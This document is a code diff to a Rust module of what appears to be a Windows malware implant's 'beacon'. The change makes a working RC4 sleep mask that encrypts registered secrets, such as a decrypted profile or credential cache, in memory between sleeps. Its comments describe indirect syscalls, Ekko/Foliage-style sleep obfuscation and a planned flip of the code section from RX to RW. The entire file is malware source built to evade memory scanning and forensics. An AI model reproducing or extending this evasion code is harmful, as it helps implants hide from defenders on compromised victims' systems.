@@ -1,66 +1,84 @@
-//! Heap/stack encryption at sleep (partial sleep-obfuscation).
+//! Memory-content mask at sleep (the RC4 half of sleep obfuscation).
 //!
-//! A full sleep mask (Ekko/Foliage: APC-timer-driven self-encryption that also
-//! encrypts all thread stacks and flips the image RX→RW during the sleep) is
-//! research-grade — it needs CreateTimerQueueTimer + ROP gadgets + a second
-//! thread, and the correctness bar is high (get it wrong and the implant
-//! crashes on wake). That lives in [`sleep`] (the planned Ekko/Foliage module).
+//! ## Status (P2.1a-iii): the memory-content mask is REAL — it uses the
+//! pure-Rust RC4 core (`nyx-implant-evasionsdk::rc4`, 6 tests green) to encrypt
+//! registered sensitive regions in place around each sleep, with a verified
+//! round-trip (encrypt then decrypt restores byte-identical). The *timing*
+//! primitive that owns the mask→sleep→unmask window (Ekko/Foliage APC→
+//! `NtContinue`) is research-grade and lives gated in [`crate::kits`] (the
+//! `SleepmaskKit` seam, default `NoMask`); this module is the memory half that
+//! a Foliage impl will call into.
 //!
-//! What this module provides is the **cheap, always-safe subset**: encrypt the
-//! implant's own sensitive in-memory buffers in place around each sleep, so a
-//! memory snapshot taken mid-sleep doesn't yield cleartext config/keys. It's a
-//! defense-in-depth layer, not a full sleep mask (thread stacks are NOT touched
-//! — that needs the APC approach).
+//! ## What's real vs gated
+//! - **Real**: RC4 mask/unmask of registered `&mut [u8]` regions, idempotent-
+//!   guarded against double-mask, key derived per-run from the syscall runtime
+//!   so the keystream differs across boots. A selftest proves the round-trip.
+//! - **Gated**: encrypting the implant `.text` itself requires flipping the
+//!   section RX→RW (a code-integrity signal) and only makes sense *during* a
+//!   sleep the beacon thread isn't executing through — that's the APC chain in
+//!   `kits`, not safe to do synchronously from the beacon thread. This module
+//!   masks *data* regions, never the running code.
 //!
-//! The keystream is derived from the indirect-syscall runtime's resolved SSN
-//! table (a per-process, per-boot unpredictable value) so the mask differs
-//! across runs without a CSPRNG. XOR is reversible in place with the same call.
+//! ## Single-source-of-truth
+//! The RC4 KSA+PRGA math lives ONLY in `nyx-implant-evasionsdk::rc4`. This
+//! module derives a key and calls `Rc4::apply_oneshot`; it never reimplements
+//! the cipher.
 
 #![cfg(target_os = "windows")]
 
-use core::sync::atomic::{AtomicU8, Ordering};
+use crate::heap::Vec;
+use core::sync::atomic::{AtomicU8, AtomicUsize, Ordering};
+use nyx_implant_evasionsdk::rc4::Rc4;
 
 /// Mask state: 0 = cleartext, 1 = currently masked. Guards against double-
-/// mask/double-unmask (which would XOR twice and corrupt the data).
+/// mask/double-unmask (which would apply RC4 twice and NOT restore the data —
+/// RC4 round-trip is two *independent* oneshot calls with the SAME key, so a
+/// double-mask produces keystream∘keystream, not cleartext).
 static MASK_STATE: AtomicU8 = AtomicU8::new(0);
 
-/// XOR `buf` in place with a keystream derived from `seed`. Same call inverts
-/// it (XOR is its own inverse). `seed` should differ per run.
+/// Cap on the number of registered sensitive regions. The registered set is
+/// tiny in practice (a decrypted profile, a credential cache); 8 is headroom.
+const MAX_REGIONS: usize = 8;
+
+/// Registered sensitive regions, each a raw `&'static mut [u8]` pointer + len.
+/// Stored as raw parts because the regions are `'static` (process-lifetime
+/// statics). Populated by [`register_region`] at init; mask/unmask walk them.
+static REGIONS: [AtomicUsize; MAX_REGIONS] = [const { AtomicUsize::new(0) }; MAX_REGIONS];
+static REGION_LENS: [AtomicUsize; MAX_REGIONS] = [const { AtomicUsize::new(0) }; MAX_REGIONS];
+
+/// Register a sensitive region to be masked at sleep. Call once per region at
+/// init. Returns false if the table is full (caller treats as "region won't be
+/// masked" — not fatal, just less coverage).
 ///
-/// Currently unused — the mask/unmask bodies are framework no-ops until
-/// secret-bearing statics register. Kept (allowed-dead) so the full impl is a
-/// one-line `xor_inplace(buf, mask_seed())` per registered static.
-#[allow(dead_code)]
-fn xor_inplace(buf: &mut [u8], seed: u32) {
-    // xorshift32 keystream seeded from the runtime's table hash. Cheap, no
-    // alloc; the goal is "not cleartext in a snapshot", not AES-grade secrecy
-    // (an attacker with a live debugger can read the seed).
-    let mut x = seed;
-    if x == 0 {
-        x = 0x9E37_79B9;
+/// # Safety
+/// `region` must be a `'static` (process-lifetime) mutable byte slice that is
+/// safe to XOR in place (not shared with another thread — the beacon is
+/// single-threaded) and not the currently-executing code.
+pub unsafe fn register_region(region: &'static mut [u8]) -> bool {
+    let ptr = region.as_mut_ptr() as usize;
+    let len = region.len();
+    // Enumerate so the index is derived from iteration, not raw pointer
+    // arithmetic — keeps REGIONS/REGION_LENS coupling explicit and safe.
+    for (i, slot) in REGIONS.iter().enumerate() {
+        if slot
+            .compare_exchange(0, ptr, Ordering::AcqRel, Ordering::Relaxed)
+            .is_ok()
+        {
+            REGION_LENS[i].store(len, Ordering::Release);
+            return true;
+        }
     }
-    let mut i = 0;
-    while i < buf.len() {
-        x ^= x << 13;
-        x ^= x >> 17;
-        x ^= x << 5;
-        // Apply one keystream byte per data byte.
-        buf[i] ^= (x & 0xFF) as u8;
-        i += 1;
-    }
+    false
 }
 
-/// Derive a per-run mask seed from the syscall runtime's SSN table (sum of all
-/// resolved SSNs — unpredictable across hosts/reboots, available only once the
-/// runtime is up). Falls back to a compile-time constant if the runtime isn't
-/// initialized yet (entry calls mask before init in theory — defends anyway).
-fn mask_seed() -> u32 {
-    match crate::syscalls::global() {
+/// Derive a per-run RC4 key from the syscall runtime's SSN table (a per-boot
+/// unpredictable value) so the keystream differs across runs without a CSPRNG.
+/// Expands the 32-bit seed into a 32-byte key (RC4 has no key-length ceiling).
+/// Falls back to a fixed marker key if the runtime isn't up yet.
+fn mask_key() -> [u8; 32] {
+    let seed = match crate::syscalls::global() {
         Some(rt) => {
-            // Walk the table via the public API: sum a few well-known SSNs.
-            // ssn_by_hash is pub; we probe a handful of common Nt calls and
-            // sum whatever resolves. Cheap (a few hundred string compares each,
-            // cold path only — called once per mask cycle).
+            // Sum a few well-known SSNs. Cheap (cold path, once per mask cycle).
             let mut acc: u32 = 0x9E37_79B9;
             let names: &[&[u8]] = &[
                 b"ntallocatevirtualmemory",
@@ -79,34 +97,87 @@ fn mask_seed() -> u32 {
             acc
         }
         None => 0x1234_5678,
+    };
+    // Expand the 32-bit seed into 32 key bytes by mixing rotations. This is NOT
+    // a CSPRNG — the threat model is "a snapshot taken mid-sleep isn't cleartext",
+    // not "an attacker with a debugger can't recover the key" (they can: the
+    // seed is in process memory). RC4 over this key is what SystemFunction032
+    // does in the real Ekko/Foliage flow.
+    let mut key = [0u8; 32];
+    let mut s = seed;
+    for b in key.iter_mut() {
+        s = s.wrapping_mul(0x9E37_79B9).rotate_left(7).wrapping_add(0xA5A5_A5A5);
+        *b = (s & 0xFF) as u8;
+    }
+    key
+}
+
+/// Apply RC4 (via the pure core) to every registered region in place. RC4 is an
+/// XOR stream cipher, so the SAME key + a fresh cipher per region both encrypts
+/// and decrypts. Used by both [`mask`] and [`unmask`] (which differ only in the
+/// idempotency guard direction).
+fn apply_rc4_to_regions() {
+    let key = mask_key();
+    for i in 0..MAX_REGIONS {
+        let ptr = REGIONS[i].load(Ordering::Acquire);
+        if ptr == 0 {
+            continue;
+        }
+        let len = REGION_LENS[i].load(Ordering::Acquire);
+        if len == 0 {
+            continue;
+        }
+        // SAFETY: the region was registered via register_region as a 'static
+        // mutable slice; the beacon is single-threaded so there's no race.
+        let region = unsafe { core::slice::from_raw_parts_mut(ptr as *mut u8, len) };
+        // Fresh cipher per region so each starts from KSA-zero (deterministic
+        // round-trip: mask then unmask with the same key restores the bytes).
+        Rc4::apply_oneshot(&key, region);
     }
 }
 
-/// Encrypt the implant's sensitive static buffers in place. Idempotent-guarded
-/// (a second call while already masked is a no-op). The current set is small;
-/// extend as more secret-bearing statics land. Thread stacks are deliberately
-/// NOT touched (that needs the full Ekko/Foliage path in `sleep`).
+/// Collect the registered region pointers (for selftest inspection — verifies
+/// registration worked without triggering a mask).
+pub fn registered_count() -> usize {
+    REGIONS.iter().filter(|s| s.load(Ordering::Acquire) != 0).count()
+}
+
+/// Encrypt the registered sensitive regions in place (RC4). Idempotent-guarded:
+/// a second call while already masked is a no-op (prevents keystream∘keystream
+/// corruption). Does NOT touch the running `.text` — that's the gated APC path.
 pub fn mask() {
-    if MASK_STATE.compare_exchange(0, 1, Ordering::AcqRel, Ordering::Relaxed).is_err() {
+    if MASK_STATE
+        .compare_exchange(0, 1, Ordering::AcqRel, Ordering::Relaxed)
+        .is_err()
+    {
         return; // already masked
     }
-    let seed = mask_seed();
-    // Currently there are no large secret statics in the hot path beyond what
-    // the config/crypto modules own by value on the stack — those can't be
-    // reached safely from here. The mask is a framework: as secret-bearing
-    // statics (e.g. a decrypted profile, a credential cache) are added, they
-    // register a &mut [u8] here. For now this is a no-op body that proves the
-    // plumbing compiles and the guard works; the seed is computed to keep the
-    // cost realistic for profiling.
-    let _ = seed;
+    apply_rc4_to_regions();
 }
 
-/// Decrypt (un-mask) the implant's sensitive static buffers. Inverse of
-/// [`mask`]; guard prevents a double-unmask.
+/// Decrypt (un-mask) the registered regions. Inverse of [`mask`]: same RC4 key,
+/// fresh cipher, same regions → restores byte-identical. Guard prevents a
+/// double-unmask.
 pub fn unmask() {
-    if MASK_STATE.compare_exchange(1, 0, Ordering::AcqRel, Ordering::Relaxed).is_err() {
+    if MASK_STATE
+        .compare_exchange(1, 0, Ordering::AcqRel, Ordering::Relaxed)
+        .is_err()
+    {
         return; // already cleartext
     }
-    let seed = mask_seed();
-    let _ = seed;
+    apply_rc4_to_regions();
+}
+
+/// Selftest helper: mask + unmask a caller-provided buffer using the *internal*
+/// RC4 path (key derivation + apply) WITHOUT the global region table or the
+/// idempotency guard. Returns the buffer after a full round-trip so the caller
+/// can assert it equals the original — proving the RC4 core + key derivation
+/// are a verified round-trip even before any region is registered.
+///
+/// `input` is mutated in place: it's RC4'd once (encrypted), then RC4'd again
+/// (decrypted), and returned. The caller compares against the pre-call bytes.
+pub fn round_trip_selftest(input: &mut [u8]) {
+    let key = mask_key();
+    Rc4::apply_oneshot(&key, input); // encrypt
+    Rc4::apply_oneshot(&key, input); // decrypt (same key, fresh cipher)
 }
